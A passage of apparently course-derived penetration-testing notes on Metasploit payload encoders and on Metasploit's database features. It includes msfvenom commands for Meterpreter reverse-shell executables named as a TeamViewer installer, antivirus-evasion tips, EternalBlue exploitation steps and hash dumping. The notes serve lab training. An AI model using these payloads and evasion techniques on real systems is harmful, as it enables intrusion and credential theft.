    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -f exe -o TeamViewerInstall.exe
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 368 (iteration=0)
    x86/shikata_ga_nai chosen with final size 368
    Payload size: 368 bytes
    Final size of exe file: 73802 bytes
    Saved as: TeamViewerInstall.exe
    
    ```
    
    - Generates a Windows x86 Meterpreter reverse TCP payload, encoded once with Shikata Ga Nai, saved as an executable (`TeamViewerInstall.exe`).
    - Result: Detected by 54 AV engines on VirusTotal (page 6).
- **Example 2: Multiple Iterations** (from document, page 5):
    
    ```
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o TeamViewerInstall.exe
    Found 1 compatible encoders
    Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 368 (iteration=0)
    x86/shikata_ga_nai succeeded with size 395 (iteration=1)
    x86/shikata_ga_nai succeeded with size 422 (iteration=2)
    x86/shikata_ga_nai succeeded with size 449 (iteration=3)
    x86/shikata_ga_nai succeeded with size 476 (iteration=4)
    x86/shikata_ga_nai succeeded with size 503 (iteration=5)
    x86/shikata_ga_nai succeeded with size 530 (iteration=6)
    x86/shikata_ga_nai succeeded with size 557 (iteration=7)
    x86/shikata_ga_nai succeeded with size 584 (iteration=8)
    x86/shikata_ga_nai succeeded with size 611 (iteration=9)
    x86/shikata_ga_nai chosen with final size 611
    Payload size: 611 bytes
    Final size of exe file: 73802 bytes
    Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe
    
    ```
    
    - Same payload, but encoded with 10 iterations of Shikata Ga Nai.
    - Size increases with each iteration (368 to 611 bytes) due to added obfuscation.
    - Result: Detected by 52 AV engines on VirusTotal, showing marginal improvement.
    - Error: Indicates a permission issue when saving the file, likely due to insufficient write permissions in `/root/Desktop`.

### VirusTotal Results

- **Single Iteration** (page 6):
    - 54 out of 70 AV engines detected the payload (`TeamViewerInstall.exe`).
    - Date: May 7, 2020.
- **Multiple Iterations (10)** (page 6):
    - 52 out of 70 AV engines detected the payload.
    - Slight improvement, but still widely detected.
- **AV Engines Detecting Payload** (from document, page 7):
    - Examples of engines detecting the payload: Arcabit, Avast, Avira, BitDefender, ClamAV, Comodo, CrowdStrike, FireEye, Fortinet, Kaspersky, McAfee, Microsoft, Sophos, Symantec.
    - Examples of engines not detecting: Antiy-AVL, Baidu, CMC, Jiangmin, Paloalto, Panda, TACHYON, VBA32, VirIT, Zoner.
- **Conclusion**: Shikata Ga Nai, even with multiple iterations, is no longer effective for AV evasion against modern AV solutions.

### Common Encoders

- **x86 Encoders** (from MS09-050 example, page 4):
    - `x86/shikata_ga_nai`: Polymorphic XOR additive feedback, historically effective.
    - `x86/alpha_mixed`, `x86/alpha_upper`: Alphanumeric encoders for restricted environments.
    - `x86/call4_dword_xor`: XOR-based encoder using call+4 technique.
    - `x86/fnstenv_mov`: Variable-length XOR encoder.
    - `x86/jmp_call_additive`: Jump/call XOR additive feedback encoder.
    - `x86/avoid_utf8_tolower`: Avoids UTF-8 characters that could break payloads.
    - `x86/nonalpha`, `x86/nonupper`: Restrict character sets for specific constraints.
    - `x86/context_cpuid`, `x86/context_stat`, `x86/context_time`: Context-keyed encoders based on CPUID, stat, or time.
    - `x86/countdown`: Single-byte XOR countdown encoder.
    - `x86/single_static_bit`: Uses a single static bit for encoding.
    - `x86/unicode_mixed`, `x86/unicode_upper`: Unicode-compatible alphanumeric encoders.
- **x64 Encoders** (from MS17-010 example, page 3):
    - `x64/xor`: Basic XOR encoder.
    - `x64/xor_dynamic`: Dynamic key XOR encoder.
    - `x64/zutto_dekiru`: A newer encoder, less documented but designed for x64 payloads.
    - `generic/none`: No encoding, raw payload.
    - `generic/eicar`: For testing AV detection with the EICAR test string.
- **Notes**:
    - x86 encoders are more numerous due to the prevalence of x86 payloads historically.
    - x64 encoders are fewer but tailored for modern 64-bit systems.

### Practical Example: Encoding a Payload

- **Scenario**: Create a Meterpreter reverse TCP payload for a Windows x86 target, encode it with Shikata Ga Nai, and test it with the MS17-010 exploit.
- **Steps**:
    1. **Generate Payload with `msfvenom`**:
        
        ```
        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
        
        ```
        
        - Architecture: x86.
        - Platform: Windows.
        - Payload: `windows/meterpreter/reverse_tcp`.
        - Encoder: `x86/shikata_ga_nai`, 5 iterations.
        - Output: Executable file (`payload.exe`).
    2. **Set Up Exploit**:
        
        ```
        msf6 > use exploit/windows/smb/ms17_010_eternalblue
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/meterpreter/reverse_tcp
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
        
        ```
        
    3. **Run Exploit**:
        
        ```
        msf6 exploit(windows/smb/ms17_010_eternalblue) > run
        
        ```
        
        - If successful, a Meterpreter session opens.
    4. **Test AV Evasion**:
        - Upload `payload.exe` to VirusTotal or test in a lab with AV software.
        - Expect detection by most modern AV engines, as shown in the document.
- **Notes**:
    - Use a lab environment (e.g., Windows 7 VM) to avoid ethical/legal issues.
    - The encoded payload may still work if the target lacks updated AV or uses behavioral detection that misses the payload’s actions.

### Limitations and Modern AV Evasion

- **Why Encoders Fail for AV Evasion**:
    - **Signature-Based Detection**: AV engines recognize patterns in Shikata Ga Nai’s polymorphic output.
    - **Behavioral Analysis**: Modern AVs detect malicious behaviors (e.g., reverse connections, DLL injection) regardless of encoding.
    - **Heuristics**: Identify suspicious code structures, even if obfuscated.
- **Alternatives for AV Evasion** (noted as outside the document’s scope):
    - **Custom Payloads**: Use tools like Veil, Shellter, or Hyperion to create unique payloads.
    - **Packers/Obfuscators**: Apply packers (e.g., UPX, Themida) or custom obfuscation.
    - **In-Memory Execution**: Use payloads like Meterpreter that run in memory to avoid disk-based detection.
    - **Encrypted Payloads**: Use `reverse_tcp_rc4` or `reverse_https` for encrypted communication.
    - **Code Injection**: Inject payloads into legitimate processes to mask execution.
    - **Polymorphic Engines**: Develop custom polymorphic code to generate unique signatures.
- **Testing Evasion**:
    - Use sandbox environments (e.g., Cuckoo Sandbox) to analyze payload behavior.
    - Test against AVs like Windows Defender, Kaspersky, or ESET in a controlled lab.
    - Avoid VirusTotal for operational payloads, as it shares samples with AV vendors.

### Practical Tips for Working with Encoders

1. **Choose the Right Encoder**:
    - Use `x86/shikata_ga_nai` for x86 payloads when bad character removal is needed.
    - Use `x64/xor` or `x64/zutto_dekiru` for x64 payloads.
    - Select `generic/none` if no encoding is required (e.g., for testing).
2. **Handle Bad Characters**:
    - Specify bad characters with `b` in `msfvenom`:
        
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f exe -o payload.exe
        
        ```
        
    - Common bad characters: `\\x00` (null byte), `\\x0a` (line feed), `\\x0d` (carriage return).
3. **Use Multiple Iterations**:
    - Increase iterations (`i`) to enhance obfuscation, but expect diminishing returns:
        
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
        
        ```
        
    - Note: Size increases with iterations, which may exceed exploit constraints.
4. **Test in a Lab**:
    - Set up VMs with vulnerable configurations (e.g., Windows 7 for MS17-010, Windows Server 2008 for MS09-050).
    - Use Metasploitable3 or custom VMs to simulate real-world scenarios.
    - Install AV software to test evasion in a controlled environment.
5. **Troubleshoot Issues**:
    - **Permission Denied Error** (as seen in page 5):
        - Ensure write permissions for the output directory:
            
            ```
            chmod +w /root/Desktop
            
            ```
            
        - Save to a different directory:
            
            ```
            msfvenom ... -o /tmp/payload.exe
            
            ```
            
    - **Payload Detection**: If detected, try alternative encoders (e.g., `x86/alpha_mixed`) or combine with other evasion techniques.
    - **Payload Failure**: Verify architecture compatibility and bad character removal.
6. **Ethical Use**:
    - Only use encoders in authorized penetration tests or personal labs.
    - Document all actions for reporting and compliance.

### Common Issues and Troubleshooting

- **Payload Detected by AV**:
    - **Solution**: Use alternative encoders, packers, or in-memory execution.
    - **Test**: Run in a lab with the target AV to confirm detection.
- **Payload Fails to Execute**:
    - **Bad Characters**: Use `b` to exclude problematic bytes.
    - **Architecture Mismatch**: Ensure `a x86` or `a x64` matches the target.
    - **Size Constraints**: Switch to a smaller encoder or payload if the exploit has size limits.
- **Permission Errors**:
    - **Solution**: Check file permissions or save to a writable directory.
    - **Example**:
        
        ```
        ls -l /root/Desktop
        sudo chown $(whoami) /root/Desktop
        
        ```
        
- **Limited Encoder Options**:
    - **Solution**: Verify the exploit and payload compatibility. For x64 targets, fewer encoders are available.
    - **Workaround**: Use `generic/none` or generate a raw payload and encode manually.

### Ethical and Practical Notes

- **Ethical Use**: Encoders and payloads must only be used in authorized environments. Unauthorized use is illegal and unethical.
- **Lab Setup**: Practice with VMs running vulnerable configurations (e.g., Windows 7 for MS17-010, Windows Server 2008 for MS09-050). Use Metasploitable3 or custom VMs.
- **Stay Updated**: Update Metasploit with `msfupdate` to access the latest encoders and fixes.
- **Learn the Vulnerabilities**:
    - **MS17-010 (EternalBlue)**: CVE-2017-0144, affects SMBv1 on Windows 7/Server 2008.
        - Microsoft Bulletin: [https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010)
        - CVE Details: [https://nvd.nist.gov/vuln/detail/CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
    - **MS09-050**: CVE-2009-3103, SMBv2 vulnerability in Windows Vista/Server 2008.
        - Microsoft Bulletin: [https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2009/ms09-050](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2009/ms09-050)
        - CVE Details: [https://nvd.nist.gov/vuln/detail/CVE-2009-3103](https://nvd.nist.gov/vuln/detail/CVE-2009-3103)

### Next Steps

- **Explore Advanced Evasion**:
    - Research tools like Veil, Shellter, or Hyperion for custom payload obfuscation.
    - Experiment with packers (e.g., UPX) or crypters to reduce detection.
    - Study in-memory execution techniques with Meterpreter or PowerShell payloads.
- **Custom Encoders**:
    - Develop custom encoders using Metasploit’s Ruby framework for unique obfuscation.
    - Example: Modify `x86/shikata_ga_nai` to use a different XOR key or algorithm.
- **Post-Exploitation**:
    - Combine encoded payloads with Meterpreter for advanced post-exploitation (e.g., `hashdump`, `getsystem`).
    - Use `post` modules to automate tasks:
        
        ```
        msf6 > use post/windows/gather/hashdump
        
        ```
        
- **Further Reading**:
    - FireEye article on Shikata Ga Nai: Research its historical effectiveness and detection methods.
    - [Hatching.io](http://hatching.io/) blog on Metasploit payloads: [https://hatching.io/blog/metasploit-payloads2/](https://hatching.io/blog/metasploit-payloads2/)
    - Metasploit documentation on encoders: [https://docs.metasploit.com/docs/using-metasploit/advanced/encoders.html](https://docs.metasploit.com/docs/using-metasploit/advanced/encoders.html)

---

## 8. Metasploit Databases

**Focus**: Explains the role of databases in Metasploit for tracking scan results, credentials, and other assessment data. Details the setup and initialization of the PostgreSQL database, workspace management, importing scan results (e.g., Nmap), and managing hosts, services, credentials, and loot.

### Key Points with Explanations

### Overview of Databases

- **Definition**: Databases in Metasploit are used to organize and store results from penetration testing, such as scan results, entry points, detected vulnerabilities, and credentials, especially during complex assessments involving multiple machines or networks.
- **Purpose**:
    1. **Result Tracking**: Manage large volumes of data (e.g., hosts, services, vulnerabilities) to reduce complexity.
    2. **Quick Access**: Provide direct access to stored results for analysis and exploitation.
    3. **Integration**: Support importing/exporting data with third-party tools (e.g., Nmap, Nessus, Nexpose).
    4. **Automation**: Allow exploit modules to use stored data (e.g., credentials, host IPs) for configuration.
- **Database System**: Metasploit uses **PostgreSQL** for its database backend, offering robust storage and querying capabilities.

### Setting Up the Database

- **Prerequisites**:
    - Ensure PostgreSQL is installed and running on the host machine.
    - Metasploit must be configured to connect to PostgreSQL.
- **Steps**:
    1. **Check PostgreSQL Status** (page 1):
        
        ```
        sudo service postgresql status
        
        ```
        
        - Output example:
            
            ```
            postgresql.service - PostgreSQL RDBMS
            Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
            Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago
            Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
            Main PID: 2147 (code=exited, status=0/SUCCESS)
            CPU: 51ms
            May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...
            May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.
            
            ```
            
        - Confirms PostgreSQL is running.
    2. **Start PostgreSQL** (if not running, page 1):
        
        ```
        sudo systemctl start postgresql
        
        ```
        
    3. **Initialize Metasploit Database** (page 1):
        
        ```
        sudo msfdb init
        
        ```
        
        - Actions performed:
            - Starts the database.
            - Creates a user (`msf`).
            - Creates databases (`msf`, `msf_test`).
            - Creates configuration file (`/usr/share/metasploit-framework/config/database.yml`).
            - Sets up the initial schema.
        - Successful output (page 3):
            
            ```
            [*] Starting database
            [*] Creating database user 'msf'
            [*] Creating databases 'msf'
            [*] Creating databases 'msf_test'
            [*] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
            [*] Creating initial database schema
            
            ```
            
        - Error example (page 2):
            
            ```
            rake aborted!
            NoMethodError: undefined method 'without' for #<Bundler::Settings:0x000055dddcf8cbo8>
            Did you mean? with_options
            
            ```
            
            - **Cause**: Outdated Metasploit version or configuration issue.
            - **Solution**:
                - Update Metasploit:
                    
                    ```
                    sudo apt update && sudo apt install metasploit-framework
                    
                    ```
                    
                - Reinitialize the database:
                    
                    ```
                    sudo msfdb init
                    
                    ```
                    
                - If initialization is skipped (database already configured):
                    
                    ```
                    [*] Database already started
                    [*] The database appears to be already configured, skipping initialization
                    
                    ```
                    
                    - Check status:
                        
                        ```
                        sudo msfdb status
                        
                        ```
                        
    4. **Run Metasploit with Database** (page 3):
        
        ```
        sudo msfdb run
        
        ```
        
        - Starts `msfconsole` and connects to the database.
        - Output:
            
            ```
            [*] Database already started
            [*] Connected to msf. Connection type: postgresql.
            
            ```
            
    5. **Reinitialize Database** (if needed, page 4):
        - Used when the database is configured but issues persist (e.g., unable to change the `msf` user password).
        - Commands:
            
            ```
            msfdb reinit
            cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
            sudo service postgresql restart
            msfconsole -q
            msf6 > db_status
            [*] Connected to msf. Connection type: postgresql.
            
            ```
            
        - Ensures the database configuration is copied to the user’s Metasploit directory (`~/.msf4/`) and PostgreSQL is restarted.
- **Troubleshooting**:
    - **Error During Initialization**: Update Metasploit or check PostgreSQL logs (`/var/log/postgresql/`).
    - **Database Already Configured**: Use `msfdb reinit` or manually edit `/usr/share/metasploit-framework/config/database.yml`.
    - **Permission Issues**: Run commands with `sudo` or ensure the user has write access to `~/.msf4/`.

### Database Commands

- **Accessing Help** (page 4):
    
    ```
    msf6 > help database
    
    ```
    
    - Lists database-related commands:
        
        ```
        db_connect        Connect to an existing database
        db_disconnect     Disconnect from the current database instance
        db_export         Export a file containing the contents of the database
        db_import         Import a scan result file (filetype will be auto-detected)
        db_nmap           Executes nmap and records the output automatically
        db_rebuild_cache  Rebuilds the database-stored module cache
        db_status         Show the current database status
        hosts             List all hosts in the database
        loot              List all loot in the database
        notes             List all notes in the database
        services          List all services in the database
        vulns             List all vulnerabilities in the database
        workspace         Switch between database workspaces
        
        ```
        
- **Check Database Status**:
    
    ```
    msf6 > db_status
    [*] Connected to msf. Connection type: postgresql.
    
    ```
    
    - Confirms the database is connected.

### Workspaces

- **Definition**: Workspaces are like project folders in Metasploit, used to segregate scan results, hosts, and data by criteria like IP, subnet, network, or domain.
- **Commands** (page 5):
    - **List Workspaces**:
        
        ```
        msf6 > workspace
        * default
        
        ```
        
        - The  indicates the active workspace (`default`).
    - **Create Workspace**:
        
        ```
        msf6 > workspace -a Target_1
        [*] Added workspace: Target_1
        [*] Workspace: Target_1
        
        ```
        
        - Creates and switches to a new workspace (`Target_1`).
    - **Switch Workspace**:
        
        ```
        msf6 > workspace Target_1
        [*] Workspace: Target_1
        
        ```
        
    - **View All Workspaces**:
        
        ```
        msf6 > workspace
          default
        * Target_1
        
        ```
        
    - **Help Menu** (page 6):
        
        ```
        msf6 > workspace -h
        Usage:
          workspace          List workspaces
          workspace -v       List workspaces verbosely
          workspace [name]   Switch workspace
          workspace -a [name]...  Add workspace(s)
          workspace -d [name]...  Delete workspace(s)
          workspace -D       Delete all workspaces
          workspace -r       Rename workspace
          workspace -h       Show this help information
        
        ```
        
- **Use Case**: Create separate workspaces for different targets (e.g., `Client_A`, `Client_B`) to organize scan results and avoid data overlap.

### Importing Scan Results

- **Purpose**: Import external scan results (e.g., Nmap) into the Metasploit database to populate hosts, services, and vulnerabilities.
- **Preferred Format**: XML (`.xml`) for `db_import`.
- **Example: Importing Nmap Results** (pages 6–7):
    - **Nmap Scan Output** (stored in `Target.nmap`, page 6):
        
        ```
        Starting Nmap 7.80 ( <https://nmap.org> ) at 2020-08-17 20:54 UTC
        Nmap scan report for 10.10.10.40
        Host is up (0.017s latency).
        Not shown: 991 closed ports
        PORT   STATE SERVICE       VERSION
        135/tcp open  msrpc         Microsoft Windows RPC
        139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
        445/tcp open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (Workgroup: WORKGROUP)
        49152/tcp open  msrpc       Microsoft Windows RPC
        49153/tcp open  msrpc       Microsoft Windows RPC
        49154/tcp open  msrpc       Microsoft Windows RPC
        49155/tcp open  msrpc       Microsoft Windows RPC
        49156/tcp open  msrpc       Microsoft Windows RPC
        49157/tcp open  msrpc       Microsoft Windows RPC
        Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
        
        ```
        
    - **Convert to XML** (if needed):
        
        ```
        nmap -sV -oX Target.xml 10.10.10.40
        
        ```
        
    - **Import into Metasploit**:
        
        ```
        msf6 > db_import Target.xml
        [*] Importing 'Nmap XML' data
        [*] Import: Parsing with 'Nokogiri v1.10.9'
        [*] Importing host 10.10.10.40
        [*] Successfully imported ~/Target.xml
        
        ```
        
    - **Verify Hosts**:
        
        ```
        msf6 > hosts
        Hosts
        address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
        10.10.10.40        Unknown  device
        
        ```
        
    - **Verify Services**:
        
        ```
        msf6 > services
        Services
        host         port  proto  name          state  info
        10.10.10.40  135   tcp    msrpc         open   Microsoft Windows RPC
        10.10.10.40  139   tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
        10.10.10.40  445   tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
        10.10.10.40  49152 tcp    msrpc         open   Microsoft Windows RPC
        10.10.10.40  49153 tcp    msrpc         open   Microsoft Windows RPC
        10.10.10.40  49154 tcp    msrpc         open   Microsoft Windows RPC
        10.10.10.40  49155 tcp    msrpc         open   Microsoft Windows RPC
        10.10.10.40  49156 tcp    msrpc         open   Microsoft Windows RPC
        10.10.10.40  49157 tcp    msrpc         open   Microsoft Windows RPC
        
        ```
        
- **Running Nmap Inside Metasploit** (page 7):
    - **Command**:
        
        ```
        msf6 > db_nmap -sV -sS 10.10.10.8
        [*] Nmap: Starting Nmap 7.80 ( <https://nmap.org> ) at 2020-08-17 21:04 UTC
        [*] Nmap: Nmap scan report for 10.10.10.8
        [*] Nmap: Host is up (0.016s latency).
        [*] Nmap: Not shown: 999 filtered ports
        [*] Nmap: PORT   STATE SERVICE VERSION
        [*] Nmap: 80/tcp open  http    HttpFileServer httpd 2.3
        [*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
        [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds
        
        ```
        
    - **Options**:
        - `sV`: Service version detection.
        - `sS`: TCP SYN scan (stealth).
    - **Result**: Automatically stores results in the database.
    - **Verify**:
        
        ```
        msf6 > hosts
        Hosts
        address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
        10.10.10.8         Windows                           device
        10.10.10.40        Unknown                           device
        
        ```
        
        ```
        msf6 > services
        Services
        host         port  proto  name  state  info
        10.10.10.8   80    tcp    http  open   HttpFileServer httpd 2.3
        ...
        
        ```
        
- **Notes**:
    - Use XML format for imports to ensure compatibility.
    - `db_nmap` is convenient for direct scanning without leaving `msfconsole`.
    - Imported data populates `hosts` and `services` tables, which can be used for exploitation (e.g., setting `RHOSTS`).

### Managing Database Content

- **Hosts** (page 9):
    - **Purpose**: Stores information about scanned or manually added hosts, including IP addresses, hostnames, OS details, and comments.
    - **Command Help**:
        
        ```
        msf6 > hosts -h
        Usage: hosts [ options ] [addr1 addr2...]
        OPTIONS:
          -a, --add          Add the hosts instead of searching
          -d, --delete       Delete the hosts instead of searching
          -c <col1,col2>     Only show the given columns (see list below)
          -C <col1,col2>     Only show the given columns until the next restart
          -h, --help         Show this help information
          -u, --up           Only show hosts which are up
          -o <file>          Send output to a file in CSV format
          -O <column>        Order rows by specified column number
          -R, --rhosts       Set RHOSTS from the results of the search
          -S, --search       Search string to filter by
          -i, --info         Change the info of a host
          -n, --name         Change the name of a host
          -m, --comment      Change the comment of a host
          -t, --tag          Add or specify a tag to a range of hosts
        Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, ...
        
        ```
        
    - **Example: Add Host Manually**:
        
        ```
        msf6 > hosts -a 10.10.10.100
        [*] Host added: 10.10.10.100
        
        ```
        
    - **Example: Add Comment**:
        
        ```
        msf6 > hosts -m "Domain Controller" 10.10.10.40
        
        ```
        
    - **Example: Set RHOSTS**:
        
        ```
        msf6 > hosts -R
        [*] Setting RHOSTS: 10.10.10.8,10.10.10.40
        
        ```
        
        - Populates `RHOSTS` for exploit modules.
- **Services** (page 10):
    - **Purpose**: Stores details about services discovered on hosts, including port, protocol, name, and state.
    - **Command Help**:
        
        ```
        msf6 > services -h
        Usage: services [-h] [-u] [-d] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <file>]
          -a, --add          Add the services instead of searching
          -d, --delete       Delete the services instead of searching
          -c <col1,col2>     Only show the given columns
          -h, --help         Show this help information
          -s <name>          Name of the service to add
          -p <port>          Search for a list of ports
          -r <protocol>      Protocol type of the service being added [tcp|udp]
          -u, --up           Only show services which are up
          -o <file>          Send output to a file in csv format
          -O <column>        Order rows by specified column number
          -R, --rhosts       Set RHOSTS from the results of the search
          -S, --search       Search string to filter by
          -U, --update       Update data for existing service
        Available columns: created_at, info, name, port, proto, state, updated_at
        
        ```
        
    - **Example: Add Service Manually**:
        
        ```
        msf6 > services -a -p 22 -r tcp -s ssh 10.10.10.40
        [*] Service added: 10.10.10.40:22/tcp (ssh)
        
        ```
        
    - **Example: Search Services**:
        
        ```
        msf6 > services -s smb
        Services
        host         port  proto  name          state  info
        10.10.10.40  445   tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
        
        ```
        
- **Credentials** (pages 10–11):
    - **Purpose**: Stores credentials (e.g., usernames, passwords, hashes) gathered during exploitation or manually added.
    - **Command Help**:
        
        ```
        msf6 > creds -h
        Usage - Listing credentials:
          creds [filter options] [address range]
        Usage - Adding credentials:
          creds add [parameters]
        General options:
          -h, --help         Show this help information
          -o <file>          Send output to a file in csv/jtr/hcat format
          -d, --delete       Delete one or more credentials
        Filter options for listing:
          -P, --password <text>  List passwords that match this text
          -p, --port <portspec>  List creds with logins on services matching this port spec
          -s <svc names>         List creds matching comma-separated service names
          -u, --user <text>      List users that match this text
          -t, --type <type>      List creds that match types: password, ntlm, hash
          -O, --origins <IP>     List creds that match these origins
          -R, --rhosts           Set RHOSTS from the results of the search
          -v, --verbose          Don't truncate long password hashes
        
        ```
        
    - **Supported Credential Types**:
        - `password`: Plaintext password.
        - `ntlm`: NTLM hash.
        - `hash`: Non-replayable hash (e.g., MD5, SHA1).
        - `ssh-key`: SSH private key (file path).
        - `postgres`: PostgreSQL MD5 hash.
        - `jtr`: John the Ripper hash type (e.g., `md5`, `sha512`).
    - **Examples: Adding Credentials**:
        - Add username and password:
            
            ```
            msf6 > creds add user:admin password:notpassword
            
            ```
            
        - Add NTLM hash:
            
            ```
            msf6 > creds add user:admin ntlm:E2FC150748F7751DD448E6B105741864:A1074AG9B1BDE45403AB680504B
            
            ```
            
        - Add SSH key:
            
            ```
            msf6 > creds add user:sshadmin ssh-key:/path/to/id_rsa
            
            ```
            
        - Add MD5 hash for John the Ripper:
            
            ```
            msf6 > creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5
            
            ```
            
    - **Examples: Listing Credentials**:
        - List all credentials:
            
            ```
            msf6 > creds
            
            ```
            
        - List credentials for SMB services:
            
            ```
            msf6 > creds -s smb
            
            ```
            
        - List NTLM credentials:
            
            ```
            msf6 > creds -t ntlm
            
            ```
            
    - **Examples: Exporting Credentials**:
        - Export to CSV:
            
            ```
            msf6 > creds -o creds.csv
            
            ```
            
        - Export to John the Ripper format:
            
            ```
            msf6 > creds -o creds.jtr
            
            ```
            
    - **Example: Deleting Credentials**:
        
        ```
        msf6 > creds -d -s smb
        [*] Deleted all SMB credentials
        
        ```
        
- **Loot** (page 12):
    - **Purpose**: Stores captured data (e.g., password hashes, files) from exploited systems, such as hash dumps or configuration files.
    - **Command Help**:
        
        ```
        msf6 > loot -h
        Usage: loot [options]
        Info: loot [-h] [addr1 addr2...] [-t <type1,type2>]
        Add: loot -f [fname] -i [info] -a [addr1 addr2...] -t [type]
        Del: loot -d [addr1 addr2...]
          -a, --add          Add loot to the list of addresses
          -d, --delete       Delete *all* loot matching host and type
          -f, --file         File with contents of the loot to add
          -i, --info         Info of the loot to add
          -t <type1,type2>   Search for a list of types
          -h, --help         Show this help information
          -S, --search       Search string to filter by
        
        ```
        
    - **Example: Add Loot**:
        
        ```
        msf6 > loot -a -f /path/to/hashes.txt -i "SAM hash dump" -t hash -a 10.10.10.40
        [*] Loot added: 10.10.10.40 (hash)
        
        ```
        
    - **Example: List Loot**:
        
        ```
        msf6 > loot
        Loot
        host         type  info            path
        10.10.10.40  hash  SAM hash dump   /path/to/hashes.txt
        
        ```
        
    - **Example: Delete Loot**:
        
        ```
        msf6 > loot -d 10.10.10.40
        [*] Deleted all loot for 10.10.10.40
        
        ```
        

### Exporting and Importing Data

- **Exporting Database** (page 8):
    - **Command**:
        
        ```
        msf6 > db_export -f xml backup.xml
        [*] Starting export of workspace default to backup.xml [xml]...
        [*] Finished export of workspace default to backup.xml [xml]...
        
        ```
        
    - **Formats**: XML, CSV, or specific formats like John the Ripper (`.jtr`) or Hashcat (`.hcat`).
    - **Use Case**: Back up assessment data or share with team members.
- **Importing Database**:
    - **Command**:
        
        ```
        msf6 > db_import backup.xml
        
        ```
        
    - **Use Case**: Restore a workspace or import data from another Metasploit instance.

### Practical Example: Using the Database

- **Scenario**: Perform a penetration test on a network, import Nmap results, and exploit a target using stored data.
- **Steps**:
    1. **Set Up Database**:
        
        ```
        sudo service postgresql start
        sudo msfdb init
        sudo msfdb run
        msf6 > db_status
        [*] Connected to msf. Connection type: postgresql.
        
        ```
        
    2. **Create Workspace**:
        
        ```
        msf6 > workspace -a Client_Network
        [*] Added workspace: Client_Network
        [*] Workspace: Client_Network
        
        ```
        
    3. **Run Nmap Scan**:
        
        ```
        msf6 > db_nmap -sV -sS 10.10.10.40
        [*] Nmap: Starting Nmap 7.80...
        [*] Nmap: PORT   STATE SERVICE       VERSION
        [*] Nmap: 445/tcp open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds
        
        ```
        
    4. **Verify Data**:
        
        ```
        msf6 > hosts
        Hosts
        address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
        10.10.10.40        Unknown  device
        
        ```
        
        ```
        msf6 > services
        Services
        host         port  proto  name          state  info
        10.10.10.40  445   tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds
        
        ```
        
    5. **Add Credentials**:
        
        ```
        msf6 > creds add user:admin password:notpassword
        [*] Credential added
        
        ```
        
    6. **Exploit Target** (e.g., MS17-010):
        
        ```
        msf6 > use exploit/windows/smb/ms17_010_eternalblue
        msf6 > set RHOSTS 10.10.10.40
        msf6 > set payload windows/x64/meterpreter/reverse_tcp
        msf6 > set LHOST 10.10.14.15
        msf6 > run
        
        ```
        
        - Uses stored host data to set `RHOSTS`.
    7. **Capture Loot** (if successful):
        
        ```
        msf6 > loot -a -f /root/hashes.txt -i "SAM hash dump" -t hash -a 10.10.10.40
        [*] Loot added: 10.10.10.40 (hash)
        
        ```
        
    8. **Export Data**:
        
        ```
        msf6 > db_export -f xml Client_Network.xml
        [*] Finished export of workspace Client_Network to Client_Network.xml [xml]...
        
        ```
        

### Integration with Encoders (from Previous Notes)

- **Using Stored Data with Encoded Payloads**:
    - **Example**: Generate an encoded payload using `msfvenom` and use stored host data for exploitation.
        
        ```
        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
        
        ```
        
        - Import host data:
            
            ```
            msf6 > db_import Target.xml
            
            ```
            
